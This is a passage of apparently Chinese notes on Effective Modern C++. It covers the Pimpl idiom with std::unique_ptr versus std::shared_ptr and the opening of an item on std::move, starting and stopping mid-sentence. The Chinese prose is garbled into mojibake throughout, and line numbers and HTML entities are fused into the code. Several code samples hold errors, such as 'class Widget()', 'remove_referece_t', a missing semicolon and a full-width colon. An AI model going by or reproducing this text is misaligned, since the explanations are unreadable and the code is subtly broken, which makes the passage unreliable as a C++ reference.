é™¤å™¨å’Œå¸Œæœ›ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–ã€‚ å¯¹äºstd::shared_ptrsï¼Œå…¶ä»–ä¸å»ºè®®ä½¿ç”¨makeå‡½æ•°çš„æƒ…å†µåŒ…æ‹¬ï¼š(1) æœ‰è‡ªå®šä¹‰å†…å­˜ç®¡ç†çš„ç±»ï¼›(2) ç‰¹åˆ«å…³æ³¨å†…å­˜çš„ç³»ç»Ÿï¼Œéå¸¸å¤§çš„å¯¹è±¡ï¼Œä»¥åŠstd::weak_ptrsæ¯”å¯¹åº”çš„std::shared_ptrsæ´»å¾—æ›´ä¹…ã€‚ 22 å½“ä½¿ç”¨ Pimpl Idiomï¼Œè¯·åœ¨å®ç°æ–‡ä»¶ä¸­å®šä¹‰ç‰¹æ®Šæˆå‘˜å‡½æ•° Pimpl Idiom å°†ç±»æ•°æ®æˆå‘˜æ›¿æ¢æˆä¸€ä¸ªæŒ‡å‘åŒ…å«å…·ä½“å®ç°çš„ç±»ï¼ˆimplementation classï¼‰ï¼ˆæˆ–ç»“æ„ä½“ï¼‰çš„æŒ‡é’ˆï¼Œå¹¶å°†åŸæœ¬æ”¾åœ¨ä¸»ç±»ï¼ˆprimary classï¼‰çš„ç›¸å…³æ•°æ®æˆå‘˜ä»¬ç§»åŠ¨åˆ°å®ç°ç±»ï¼ˆimplementation classï¼‰å»ï¼Œè€Œè¿™äº›æ•°æ®æˆå‘˜çš„è®¿é—®å°†é€šè¿‡æŒ‡é’ˆé—´æ¥è®¿é—®ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š 123456789class Widget() &#123; //å®šä¹‰åœ¨å¤´æ–‡ä»¶â€œwidget.hâ€public: Widget(); â€¦private: std::string name; std::vector&lt;double&gt; data; Gadget g1, g2, g3; //Gadgetæ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ç±»å‹&#125;; å› ä¸ºç±»Widgetçš„æ•°æ®æˆå‘˜åŒ…å«æœ‰ç±»å‹std::stringï¼Œstd::vectorå’ŒGadgetï¼Œ å®šä¹‰æœ‰è¿™äº›ç±»å‹çš„å¤´æ–‡ä»¶åœ¨ç±»Widgetç¼–è¯‘çš„æ—¶å€™ï¼Œå¿…é¡»è¢«åŒ…å«è¿›æ¥ï¼Œè¿™æ„å‘³ç€ç±»Widgetçš„ä½¿ç”¨è€…å¿…é¡»è¦#include &lt;string&gt;ï¼Œ&lt;vector&gt;ä»¥åŠgadget.hã€‚ è¿™äº›å¤´æ–‡ä»¶å°†ä¼šå¢åŠ ç±»Widgetä½¿ç”¨è€…çš„ç¼–è¯‘æ—¶é—´ï¼Œå¹¶ä¸”è®©è¿™äº›ä½¿ç”¨è€…ä¾èµ–äºè¿™äº›å¤´æ–‡ä»¶ã€‚ å¦‚æœä¸€ä¸ªå¤´æ–‡ä»¶çš„å†…å®¹å˜äº†ï¼Œç±»Widgetä½¿ç”¨è€…ä¹Ÿå¿…é¡»è¦é‡æ–°ç¼–è¯‘ã€‚ æ ‡å‡†åº“æ–‡ä»¶&lt;string&gt;å’Œ&lt;vector&gt;ä¸æ˜¯å¾ˆå¸¸å˜ï¼Œä½†æ˜¯gadget.hå¯èƒ½ä¼šç»å¸¸ä¿®è®¢ã€‚ åœ¨C++98ä¸­ä½¿ç”¨Pimplæƒ¯ç”¨æ³•ï¼Œå¯ä»¥æŠŠWidgetçš„æ•°æ®æˆå‘˜æ›¿æ¢æˆä¸€ä¸ªåŸå§‹æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªå·²ç»è¢«å£°æ˜è¿‡å´è¿˜æœªè¢«å®šä¹‰çš„ç»“æ„ä½“: 1234567891011class Widget //ä»ç„¶åœ¨â€œwidget.hâ€ä¸­&#123;public: Widget(); ~Widget(); â€¦private: struct Impl; //å£°æ˜ä¸€ä¸ª å®ç°ç»“æ„ä½“ Impl *pImpl; //ä»¥åŠæŒ‡å‘å®ƒçš„æŒ‡é’ˆ&#125;; å› ä¸ºç±»Widgetä¸å†æåˆ°ç±»å‹std::stringï¼Œstd::vectorä»¥åŠGadgetï¼ŒWidgetçš„ä½¿ç”¨è€…ä¸å†éœ€è¦ä¸ºäº†è¿™äº›ç±»å‹è€Œå¼•å…¥å¤´æ–‡ä»¶ã€‚ è¿™å¯ä»¥åŠ é€Ÿç¼–è¯‘ï¼Œå¹¶ä¸”æ„å‘³ç€ï¼Œå¦‚æœè¿™äº›å¤´æ–‡ä»¶ä¸­æœ‰æ‰€å˜åŠ¨ï¼ŒWidgetçš„ä½¿ç”¨è€…ä¸ä¼šå—åˆ°å½±å“ã€‚ ä¸€ä¸ªå·²ç»è¢«å£°æ˜ï¼Œå´è¿˜æœªè¢«å®ç°çš„ç±»å‹ï¼Œè¢«ç§°ä¸ºæœªå®Œæˆç±»å‹ï¼ˆincomplete typeï¼‰ã€‚ Widget::Implå°±æ˜¯è¿™ç§ç±»å‹ã€‚ ä¸‹ä¸€æ­¥æ˜¯å¯¹ å®ç°ç±»ï¼ˆimplementation classï¼‰ çš„å†…å­˜ç®¡ç†ï¼š åœ¨Widget.cppé‡Œ: 1234567891011121314151617#include \"widget.h\" //ä»¥ä¸‹ä»£ç å‡åœ¨å®ç°æ–‡ä»¶â€œwidget.cppâ€é‡Œ#include \"gadget.h\"#include &lt;string&gt;#include &lt;vector&gt;struct Widget::Impl &#123; //å«æœ‰ä¹‹å‰åœ¨Widgetä¸­çš„æ•°æ®æˆå‘˜çš„ std::string name; //Widget::Implç±»å‹çš„å®šä¹‰ std::vector&lt;double&gt; data; Gadget g1,g2,g3;&#125;;Widget::Widget() //ä¸ºæ­¤Widgetå¯¹è±¡åˆ†é…æ•°æ®æˆå‘˜: pImpl(new Impl)&#123;&#125;Widget::~Widget() //é”€æ¯æ•°æ®æˆå‘˜&#123; delete pImpl; &#125; å®ƒä½¿ç”¨äº†åŸå§‹æŒ‡é’ˆï¼ŒåŸå§‹çš„newå’ŒåŸå§‹çš„deleteï¼Œä¸€åˆ‡éƒ½è®©å®ƒå¦‚æ­¤çš„...åŸå§‹ã€‚ ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆ å¦‚æœæˆ‘ä»¬æƒ³è¦çš„åªæ˜¯åœ¨ç±»Widgetçš„æ„é€ å‡½æ•°åŠ¨æ€åˆ†é…Widget::implå¯¹è±¡ï¼Œåœ¨Widgetå¯¹è±¡é”€æ¯æ—¶ä¸€å¹¶é”€æ¯å®ƒï¼Œ std::unique_ptræ˜¯æœ€åˆé€‚çš„å·¥å…·ã€‚ 123456789class Widget &#123; //åœ¨â€œwidget.hâ€ä¸­public: Widget(); â€¦private: struct Impl; std::unique_ptr&lt;Impl&gt; pImpl; //ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆè€Œä¸æ˜¯åŸå§‹æŒ‡é’ˆ&#125;; å®ç°æ–‡ä»¶ä¹Ÿå¯ä»¥æ”¹æˆå¦‚ä¸‹ï¼š 1234567891011121314#include \"widget.h\" //åœ¨â€œwidget.cppâ€ä¸­#include \"gadget.h\"#include &lt;string&gt;#include &lt;vector&gt;struct Widget::Impl &#123; //è·Ÿä¹‹å‰ä¸€æ · std::string name; std::vector&lt;double&gt; data; Gadget g1,g2,g3;&#125;;Widget::Widget() : pImpl(std::make_unique&lt;Impl&gt;()) &#123;&#125; é—®é¢˜å‡ºç°äº† ä»¥ä¸Šçš„ä»£ç èƒ½ç¼–è¯‘ï¼Œä½†æ˜¯ï¼Œæœ€æ™®é€šçš„Widgetç”¨æ³•å´ä¼šå¯¼è‡´ç¼–è¯‘å‡ºé”™ï¼š 123#include \"widget.h\"Widget w; //é”™è¯¯ï¼ åœ¨å¯¹è±¡wè¢«ææ„æ—¶ï¼ˆä¾‹å¦‚ç¦»å¼€äº†ä½œç”¨åŸŸï¼‰ï¼Œé—®é¢˜å‡ºç°äº†ã€‚ åœ¨è¿™ä¸ªæ—¶å€™ï¼Œå®ƒçš„ææ„å‡½æ•°è¢«è°ƒç”¨ã€‚æˆ‘ä»¬åœ¨ç±»çš„å®šä¹‰é‡Œä½¿ç”¨äº†std::unique_ptrï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡æœ‰å£°æ˜ææ„å‡½æ•°ã€‚ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ä¸ºæˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªææ„å‡½æ•°ã€‚ åœ¨è¿™ä¸ªææ„å‡½æ•°é‡Œï¼Œç¼–è¯‘å™¨ä¼šæ’å…¥ä¸€äº›ä»£ç æ¥è°ƒç”¨ç±»Widgetçš„æ•°æ®æˆå‘˜pImplçš„ææ„å‡½æ•°ã€‚ é—®é¢˜å°±åœ¨äºï¼Œæ­¤æ—¶pImplçš„ææ„å‡½æ•°è°ƒç”¨é»˜è®¤çš„åˆ é™¤å™¨ã€‚é»˜è®¤åˆ é™¤å™¨æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒä½¿ç”¨deleteæ¥é”€æ¯å†…ç½®äºstd::unique_ptrçš„åŸå§‹æŒ‡é’ˆã€‚ç„¶è€Œï¼Œåœ¨ä½¿ç”¨deleteä¹‹å‰ï¼Œé€šå¸¸ä¼šä½¿é»˜è®¤åˆ é™¤å™¨ä½¿ç”¨C++11çš„ç‰¹æ€§static_assertæ¥ç¡®ä¿åŸå§‹æŒ‡é’ˆæŒ‡å‘çš„ç±»å‹ä¸æ˜¯ä¸€ä¸ªæœªå®Œæˆç±»å‹ã€‚ éœ€è¦ç¡®ä¿åœ¨ç¼–è¯‘å™¨ç”Ÿæˆé”€æ¯std::unique_ptr&lt;Widget::Impl&gt;çš„ä»£ç ä¹‹å‰ï¼Œ Widget::Implå·²ç»æ˜¯ä¸€ä¸ªå®Œæˆç±»å‹ï¼ˆcomplete typeï¼‰ã€‚ å½“ç¼–è¯‘å™¨â€œçœ‹åˆ°â€å®ƒçš„å®šä¹‰çš„æ—¶å€™ï¼Œè¯¥ç±»å‹å°±æˆä¸ºå®Œæˆç±»å‹äº†ã€‚ ä½†æ˜¯ Widget::Implçš„å®šä¹‰åœ¨widget.cppé‡Œã€‚ æˆåŠŸç¼–è¯‘çš„å…³é”®ï¼Œå°±æ˜¯åœ¨widget.cppæ–‡ä»¶å†…ï¼Œè®©ç¼–è¯‘å™¨åœ¨â€œçœ‹åˆ°â€ Widgetçš„ææ„å‡½æ•°å®ç°ä¹‹å‰ï¼ˆä¹Ÿå³ç¼–è¯‘å™¨æ’å…¥çš„ï¼Œç”¨æ¥é”€æ¯std::unique_ptrè¿™ä¸ªæ•°æ®æˆå‘˜çš„ä»£ç æ®µä¹‹å‰ï¼‰ï¼Œå…ˆå®šä¹‰Widget::Implã€‚ ä¿®æ”¹æ–¹æ³•å°±æ˜¯ï¼Œåœ¨widget.hé‡Œåªå£°æ˜ç±»Widgetçš„ææ„å‡½æ•°ï¼Œä½†ä¸è¦åœ¨è¿™é‡Œå®šä¹‰å®ƒï¼š 12345678910class Widget &#123; //è·Ÿä¹‹å‰ä¸€æ ·ï¼Œåœ¨â€œwidget.hâ€ä¸­public: Widget(); ~Widget(); //åªæœ‰å£°æ˜è¯­å¥ â€¦private: //è·Ÿä¹‹å‰ä¸€æ · struct Impl; std::unique_ptr&lt;Impl&gt; pImpl;&#125;; åœ¨widget.cppæ–‡ä»¶ä¸­ï¼Œåœ¨ç»“æ„ä½“Widget::Implè¢«å®šä¹‰ä¹‹åï¼Œå†å®šä¹‰ææ„å‡½æ•°ï¼š 123456789101112131415161718#include \"widget.h\" //è·Ÿä¹‹å‰ä¸€æ ·ï¼Œåœ¨â€œwidget.cppâ€ä¸­#include \"gadget.h\"#include &lt;string&gt;#include &lt;vector&gt;// å…ˆäºææ„å‡½æ•°å®šä¹‰struct Widget::Impl &#123; //è·Ÿä¹‹å‰ä¸€æ ·ï¼Œå®šä¹‰Widget::Impl std::string name; std::vector&lt;double&gt; data; Gadget g1,g2,g3;&#125;Widget::Widget() //è·Ÿä¹‹å‰ä¸€æ ·: pImpl(std::make_unique&lt;Impl&gt;())&#123;&#125;Widget::~Widget() //ææ„å‡½æ•°çš„å®šä¹‰&#123;&#125; å¦‚æœä½ æƒ³å¼ºè°ƒç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„ææ„å‡½æ•°ä¼šåšå’Œä½ ä¸€æ ·æ­£ç¡®çš„äº‹æƒ…ï¼Œä½ å¯ä»¥ç›´æ¥ä½¿ç”¨â€œ= defaultâ€å®šä¹‰ææ„å‡½æ•°ä½“ 1Widget::~Widget() = default; //åŒä¸Šè¿°ä»£ç æ•ˆæœä¸€è‡´ ç§»åŠ¨ ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„ç§»åŠ¨æ“ä½œå¯¹å…¶ä¸­çš„std::unique_ptrè¿›è¡Œç§»åŠ¨ã€‚ä½†æ˜¯ï¼Œå£°æ˜ä¸€ä¸ªç±»Widgetçš„ææ„å‡½æ•°ä¼šé˜»æ­¢ç¼–è¯‘å™¨ç”Ÿæˆç§»åŠ¨æ“ä½œï¼Œæ‰€ä»¥ä½ éœ€è¦è¿™æ ·åšï¼š 12345678910111213class Widget &#123; //ä»ç„¶åœ¨â€œwidget.hâ€ä¸­public: Widget(); ~Widget(); Widget(Widget&amp;&amp; rhs) = default; //æ€è·¯æ­£ç¡®ï¼Œ Widget&amp; operator=(Widget&amp;&amp; rhs) = default; //ä½†ä»£ç é”™è¯¯ â€¦private: //è·Ÿä¹‹å‰ä¸€æ · struct Impl; std::unique_ptr&lt;Impl&gt; pImpl;&#125;; é—®é¢˜åœ¨äºï¼š ç¼–è¯‘å™¨ç”Ÿæˆçš„ç§»åŠ¨èµ‹å€¼æ“ä½œç¬¦ï¼Œåœ¨é‡æ–°èµ‹å€¼ä¹‹å‰ï¼Œéœ€è¦å…ˆé”€æ¯æŒ‡é’ˆpImplæŒ‡å‘çš„å¯¹è±¡ã€‚ç„¶è€Œåœ¨Widgetçš„å¤´æ–‡ä»¶é‡Œï¼ŒpImplæŒ‡é’ˆæŒ‡å‘çš„æ˜¯ä¸€ä¸ªæœªå®Œæˆç±»å‹ã€‚ ç§»åŠ¨æ„é€ å‡½æ•°çš„æƒ…å†µæœ‰æ‰€ä¸åŒã€‚ ç§»åŠ¨æ„é€ å‡½æ•°çš„é—®é¢˜æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„ä»£ç é‡Œï¼ŒåŒ…å«æœ‰æŠ›å‡ºå¼‚å¸¸çš„äº‹ä»¶ï¼Œåœ¨è¿™ä¸ªäº‹ä»¶é‡Œä¼šç”Ÿæˆé”€æ¯pImplçš„ä»£ç ã€‚ è¿™äº›éƒ½éœ€è¦ï¼ŒImplæ˜¯ä¸€ä¸ªå®Œæˆç±»å‹ã€‚ è§£å†³æ–¹æ³•ï¼š æŠŠç§»åŠ¨æ“ä½œçš„å®šä¹‰ç§»åŠ¨åˆ°å®ç°æ–‡ä»¶é‡Œ 12345678910111213class Widget &#123; //ä»ç„¶åœ¨â€œwidget.hâ€ä¸­public: Widget(); ~Widget(); Widget(Widget&amp;&amp; rhs); //åªæœ‰å£°æ˜ Widget&amp; operator=(Widget&amp;&amp; rhs); â€¦private: //è·Ÿä¹‹å‰ä¸€æ · struct Impl; std::unique_ptr&lt;Impl&gt; pImpl;&#125;; 12345678910111213#include &lt;string&gt; //è·Ÿä¹‹å‰ä¸€æ ·ï¼Œä»ç„¶åœ¨â€œwidget.cppâ€ä¸­â€¦ struct Widget::Impl &#123; â€¦ &#125;; //è·Ÿä¹‹å‰ä¸€æ ·Widget::Widget() //è·Ÿä¹‹å‰ä¸€æ ·: pImpl(std::make_unique&lt;Impl&gt;())&#123;&#125;Widget::~Widget() = default; //è·Ÿä¹‹å‰ä¸€æ ·Widget::Widget(Widget&amp;&amp; rhs) = default; //è¿™é‡Œå®šä¹‰Widget&amp; Widget::operator=(Widget&amp;&amp; rhs) = default; æ‹·è´ å¯¹äº struct Impl ä¸­æ•°æ®æˆå‘˜ï¼Œå¯ä»¥ä½¿ç”¨é»˜è®¤æ‹·è´å‡½æ•°ï¼Œå®Œæˆæ‹·è´åŠ¨ä½œã€‚ 1234567891011class Widget &#123; //ä»ç„¶åœ¨â€œwidget.hâ€ä¸­public: â€¦ Widget(const Widget&amp; rhs); //åªæœ‰å£°æ˜ Widget&amp; operator=(const Widget&amp; rhs);private: //è·Ÿä¹‹å‰ä¸€æ · struct Impl; std::unique_ptr&lt;Impl&gt; pImpl;&#125;; 12345678910111213141516#include &lt;string&gt; //è·Ÿä¹‹å‰ä¸€æ ·ï¼Œä»ç„¶åœ¨â€œwidget.cppâ€ä¸­â€¦ struct Widget::Impl &#123; â€¦ &#125;; //è·Ÿä¹‹å‰ä¸€æ ·Widget::~Widget() = default; //å…¶ä»–å‡½æ•°ï¼Œè·Ÿä¹‹å‰ä¸€æ ·Widget::Widget(const Widget&amp; rhs) //æ‹·è´æ„é€ å‡½æ•°: pImpl(std::make_unique&lt;Impl&gt;(*rhs.pImpl))&#123;&#125;Widget&amp; Widget::operator=(const Widget&amp; rhs) //æ‹·è´operator=&#123; *pImpl = *rhs.pImpl; return *this;&#125; åˆ©ç”¨äº†ç¼–è¯‘å™¨ä¼šä¸ºæˆ‘ä»¬è‡ªåŠ¨ç”Ÿæˆç»“æ„ä½“Implçš„å¤åˆ¶æ“ä½œå‡½æ•°çš„æœºåˆ¶ï¼Œè€Œä¸æ˜¯é€ä¸€å¤åˆ¶ç»“æ„ä½“Implçš„æˆå‘˜ï¼Œè‡ªåŠ¨ç”Ÿæˆçš„å¤åˆ¶æ“ä½œèƒ½è‡ªåŠ¨å¤åˆ¶æ¯ä¸€ä¸ªæˆå‘˜ã€‚ std::shared_ptr å¦‚æœæˆ‘ä»¬ä½¿ç”¨std::shared_ptrè€Œä¸æ˜¯std::unique_ptræ¥åšpImplæŒ‡é’ˆï¼Œæœ¬æ¡æ¬¾çš„å»ºè®®ä¸å†é€‚ç”¨ã€‚ ä¸éœ€è¦åœ¨ç±»Widgeté‡Œå£°æ˜ææ„å‡½æ•°ï¼Œæ²¡æœ‰äº†ç”¨æˆ·å®šä¹‰ææ„å‡½æ•°ï¼Œç¼–è¯‘å™¨å°†ä¼šæˆç§»åŠ¨æ“ä½œï¼Œå¹¶ä¸”å°†ä¼šå¦‚æˆ‘ä»¬æ‰€æœŸæœ›èˆ¬å·¥ä½œã€‚widget.hé‡Œçš„ä»£ç å¦‚ä¸‹ï¼Œ 123456789class Widget &#123; //åœ¨â€œwidget.hâ€ä¸­public: Widget(); â€¦ //æ²¡æœ‰ææ„å‡½æ•°å’Œç§»åŠ¨æ“ä½œçš„å£°æ˜private: struct Impl; std::shared_ptr&lt;Impl&gt; pImpl; //ç”¨std::shared_ptr&#125;; //è€Œä¸æ˜¯std::unique_ptr è¿™æ˜¯#includeäº†widget.hçš„å®¢æˆ·ä»£ç ï¼Œ 123Widget w1;auto w2(std::move(w1)); //ç§»åŠ¨æ„é€ w2w1 = std::move(w2); //ç§»åŠ¨èµ‹å€¼w1 è¿™äº›éƒ½èƒ½ç¼–è¯‘ï¼Œå¹¶ä¸”å·¥ä½œåœ°å¦‚æˆ‘ä»¬æ‰€æœ›ï¼šw1å°†ä¼šè¢«é»˜è®¤æ„é€ ï¼Œå®ƒçš„å€¼ä¼šè¢«ç§»åŠ¨è¿›w2ï¼Œéšåå€¼å°†ä¼šè¢«ç§»åŠ¨å›w1ï¼Œç„¶åä¸¤è€…éƒ½ä¼šè¢«é”€æ¯ï¼ˆæŒ‡å‘çš„Widget::Implå¯¹è±¡ä¸€å¹¶ä¹Ÿè¢«é”€æ¯ï¼‰ã€‚ std::unique_ptrå’Œstd::shared_ptråœ¨pImplæŒ‡é’ˆä¸Šçš„è¡¨ç°ä¸Šçš„åŒºåˆ«çš„æ·±å±‚åŸå› åœ¨äºï¼Œä»–ä»¬æ”¯æŒè‡ªå®šä¹‰åˆ é™¤å™¨çš„æ–¹å¼ä¸åŒã€‚ å¯¹std::unique_ptrè€Œè¨€ï¼Œåˆ é™¤å™¨çš„ç±»å‹æ˜¯è¿™ä¸ªæ™ºèƒ½æŒ‡é’ˆçš„ä¸€éƒ¨åˆ†ï¼Œè¿™è®©ç¼–è¯‘å™¨æœ‰å¯èƒ½ç”Ÿæˆæ›´å°çš„è¿è¡Œæ—¶æ•°æ®ç»“æ„å’Œæ›´å¿«çš„è¿è¡Œä»£ç ã€‚ è¿™ç§æ›´é«˜æ•ˆç‡çš„åæœä¹‹ä¸€å°±æ˜¯std::unique_ptræŒ‡å‘çš„ç±»å‹ï¼Œåœ¨ç¼–è¯‘å™¨çš„ç”Ÿæˆç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼ˆå¦‚ææ„å‡½æ•°ï¼Œç§»åŠ¨æ“ä½œï¼‰è¢«è°ƒç”¨æ—¶ï¼Œå¿…é¡»å·²ç»æ˜¯ä¸€ä¸ªå®Œæˆç±»å‹ã€‚ è€Œå¯¹std::shared_ptrè€Œè¨€ï¼Œåˆ é™¤å™¨çš„ç±»å‹ä¸æ˜¯è¯¥æ™ºèƒ½æŒ‡é’ˆçš„ä¸€éƒ¨åˆ†ï¼Œè¿™è®©å®ƒä¼šç”Ÿæˆæ›´å¤§çš„è¿è¡Œæ—¶æ•°æ®ç»“æ„å’Œç¨å¾®æ…¢ç‚¹çš„ä»£ç ï¼Œä½†æ˜¯å½“ç¼–è¯‘å™¨ç”Ÿæˆçš„ç‰¹æ®Šæˆå‘˜å‡½æ•°è¢«ä½¿ç”¨çš„æ—¶å€™ï¼ŒæŒ‡å‘çš„å¯¹è±¡ä¸å¿…æ˜¯ä¸€ä¸ªå®Œæˆç±»å‹ã€‚ ç»“è®º Pimpl æƒ¯ç”¨æ³•é€šè¿‡å‡å°‘åœ¨ç±»å®ç°å’Œç±»ä½¿ç”¨è€…ä¹‹é—´çš„ç¼–è¯‘ä¾èµ–æ¥å‡å°‘ç¼–è¯‘æ—¶é—´ã€‚ å¯¹äºstd::unique_ptrç±»å‹çš„pImplæŒ‡é’ˆï¼Œéœ€è¦åœ¨å¤´æ–‡ä»¶çš„ç±»é‡Œå£°æ˜ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œå¹¶åœ¨å®ç°æ–‡ä»¶ä¸­ struct Implå®šä¹‰ä¹‹åæ¥å®ç°ä»–ä»¬ã€‚å³ä½¿æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„ä»£ç å¯ä»¥å·¥ä½œï¼Œä¹Ÿè¦è¿™ä¹ˆåšã€‚ ä»¥ä¸Šçš„å»ºè®®åªé€‚ç”¨äºstd::unique_ptrï¼Œä¸é€‚ç”¨äºstd::shared_ptrã€‚ 23 ç†è§£std::moveå’Œstd::forward Intro ç§»åŠ¨è¯­ä¹‰ä½¿ç¼–è¯‘å™¨æœ‰å¯èƒ½ç”¨å»‰ä»·çš„ç§»åŠ¨æ“ä½œæ¥ä»£æ›¿æ˜‚è´µçš„æ‹·è´æ“ä½œã€‚æ­£å¦‚æ‹·è´æ„é€ å‡½æ•°å’Œæ‹·è´èµ‹å€¼æ“ä½œç¬¦ç»™äº†ä½ æ§åˆ¶æ‹·è´è¯­ä¹‰çš„æƒåŠ›ï¼Œç§»åŠ¨æ„é€ å‡½æ•°å’Œç§»åŠ¨èµ‹å€¼æ“ä½œç¬¦ä¹Ÿç»™äº†ä½ æ§åˆ¶ç§»åŠ¨è¯­ä¹‰çš„æƒåŠ›ã€‚ç§»åŠ¨è¯­ä¹‰ä¹Ÿå…è®¸åˆ›å»ºåªå¯ç§»åŠ¨ï¼ˆmove-onlyï¼‰çš„ç±»å‹ï¼Œä¾‹å¦‚std::unique_ptrï¼Œstd::futureå’Œstd::threadã€‚ å®Œç¾è½¬å‘ä½¿æ¥æ”¶ä»»æ„æ•°é‡å®å‚çš„å‡½æ•°æ¨¡æ¿æˆä¸ºå¯èƒ½ï¼Œå®ƒå¯ä»¥å°†å®å‚è½¬å‘åˆ°å…¶ä»–çš„å‡½æ•°ï¼Œä½¿ç›®æ ‡å‡½æ•°æ¥æ”¶åˆ°çš„å®å‚ä¸è¢«ä¼ é€’ç»™è½¬å‘å‡½æ•°çš„å®å‚ä¿æŒä¸€è‡´ã€‚ å³å€¼å¼•ç”¨æ˜¯è¿æ¥è¿™ä¸¤ä¸ªæˆªç„¶ä¸åŒçš„æ¦‚å¿µçš„èƒ¶åˆå‰‚ã€‚å®ƒæ˜¯ä½¿ç§»åŠ¨è¯­ä¹‰å’Œå®Œç¾è½¬å‘å˜å¾—å¯èƒ½çš„åŸºç¡€è¯­è¨€æœºåˆ¶ã€‚ ä½†æ˜¯ï¼Œstd::moveå¹¶ä¸ç§»åŠ¨ä»»ä½•ä¸œè¥¿ï¼Œå®Œç¾è½¬å‘ä¹Ÿå¹¶ä¸å®Œç¾ã€‚ç§»åŠ¨æ“ä½œå¹¶ä¸æ°¸è¿œæ¯”å¤åˆ¶æ“ä½œæ›´å»‰ä»·ã€‚æ„é€ â€œtype&amp;&amp;â€ä¹Ÿå¹¶éæ€»æ˜¯ä»£è¡¨ä¸€ä¸ªå³å€¼å¼•ç”¨ã€‚ éå¸¸é‡è¦çš„ä¸€ç‚¹æ˜¯è¦ç‰¢è®°å½¢å‚æ°¸è¿œæ˜¯å·¦å€¼ï¼Œå³ä½¿å®ƒçš„ç±»å‹æ˜¯ä¸€ä¸ªå³å€¼å¼•ç”¨ã€‚æ¯”å¦‚ï¼Œå‡è®¾ 1void f(Widget&amp;&amp; w); å½¢å‚wæ˜¯ä¸€ä¸ªå·¦å€¼ï¼Œå³ä½¿å®ƒçš„ç±»å‹æ˜¯ä¸€ä¸ªrvalue-reference-to-Widgetã€‚ std::moveå’Œstd::forwardä¸ä¼šåšä»€ä¹ˆ std::moveä¸ç§»åŠ¨ï¼ˆmoveï¼‰ä»»ä½•ä¸œè¥¿ï¼Œstd::forwardä¹Ÿä¸è½¬å‘ï¼ˆforwardï¼‰ä»»ä½•ä¸œè¥¿ã€‚åœ¨è¿è¡Œæ—¶ï¼Œå®ƒä»¬ä¸åšä»»ä½•äº‹æƒ…ã€‚å®ƒä»¬ä¸äº§ç”Ÿä»»ä½•å¯æ‰§è¡Œä»£ç ï¼Œä¸€å­—èŠ‚ä¹Ÿæ²¡æœ‰ã€‚ std::move C++11çš„std::moveçš„ç¤ºä¾‹å®ç°ã€‚å®ƒå¹¶ä¸å®Œå…¨æ»¡è¶³æ ‡å‡†ç»†åˆ™ï¼Œä½†æ˜¯å®ƒå·²ç»éå¸¸æ¥è¿‘äº†ã€‚ 123456789template&lt;typename T&gt; typename remove_reference&lt;T&gt;::type&amp;&amp;move(T&amp;&amp; param)&#123; using ReturnType = typename remove_reference&lt;T&gt;::type&amp;&amp;; return static_cast&lt;ReturnType&gt;(param);&#125; è¯¥å‡½æ•°è¿”å›ç±»å‹çš„&amp;&amp;éƒ¨åˆ†è¡¨æ˜std::moveå‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªå³å€¼å¼•ç”¨ï¼Œä½†æ˜¯ï¼Œå¦‚æœç±»å‹Tæ°å¥½æ˜¯ä¸€ä¸ªå·¦å€¼å¼•ç”¨ï¼Œé‚£ä¹ˆT&amp;&amp;å°†ä¼šæˆä¸ºä¸€ä¸ªå·¦å€¼å¼•ç”¨ã€‚ æ‰€ä»¥ï¼Œä½¿ç”¨ std::remove_referenceï¼Œå¾—åˆ° ReturnTypeã€‚è¿™ä¿è¯äº†std::moveè¿”å›çš„çœŸçš„æ˜¯å³å€¼å¼•ç”¨ã€‚ std::moveåœ¨C++14ä¸­å¯ä»¥è¢«æ›´ç®€å•åœ°å®ç°ã€‚ 123456template&lt;typename T&gt;decltype(auto) move(T&amp;&amp; param) //åœ¨stdå‘½åç©ºé—´&#123; using ReturnType = remove_referece_t&lt;T&gt;&amp;&amp;; return static_cast&lt;ReturnType&gt;(param);&#125; å› æ­¤ï¼Œstd::moveå°†å®ƒçš„å®å‚è½¬æ¢ä¸ºä¸€ä¸ªå³å€¼ï¼Œè¿™å°±æ˜¯å®ƒçš„å…¨éƒ¨ä½œç”¨ã€‚ const çš„é™åˆ¶ 1234567891011class Annotation &#123;public: explicit Annotation(const std::string text) ï¼švalue(std::move(text)) //â€œç§»åŠ¨â€textåˆ°valueé‡Œï¼›è¿™æ®µä»£ç æ‰§è¡Œèµ·æ¥ &#123; â€¦ &#125; //å¹¶ä¸æ˜¯çœ‹èµ·æ¥é‚£æ · â€¦private: std::string value;&#125;; è¿™æ®µä»£ç å¯ä»¥ç¼–è¯‘ï¼Œå¯ä»¥é“¾æ¥ï¼Œå¯ä»¥è¿è¡Œã€‚ texté€šè¿‡std::moveè¢«è½¬æ¢åˆ°å³å€¼ï¼Œä½†æ˜¯textè¢«å£°æ˜ä¸ºconst std::stringï¼Œæ‰€ä»¥åœ¨è½¬æ¢ä¹‹å‰ï¼Œtextæ˜¯ä¸€ä¸ªå·¦å€¼çš„const std::stringï¼Œè€Œè½¬æ¢çš„ç»“æœæ˜¯ä¸€ä¸ªå³å€¼çš„const std::string é‚£ä¹ˆï¼Œstring å¯¹ value èµ‹å€¼æ—¶ï¼Œè°ƒç”¨çš„æ˜¯å“ªä¸ªæ„é€ å‡½æ•°ï¼Ÿ 1234567class string &#123; //std::stringäº‹å®ä¸Šæ˜¯public: //std::basic_string&lt;char&gt;çš„ç±»å‹åˆ«å â€¦ string(const string&amp; rhs); //æ‹·è´æ„é€ å‡½æ•° string(string&amp;&amp; rhs); //ç§»åŠ¨æ„é€ å‡½æ•° â€¦&#125;; å³å€¼ä¸èƒ½è¢«ä¼ 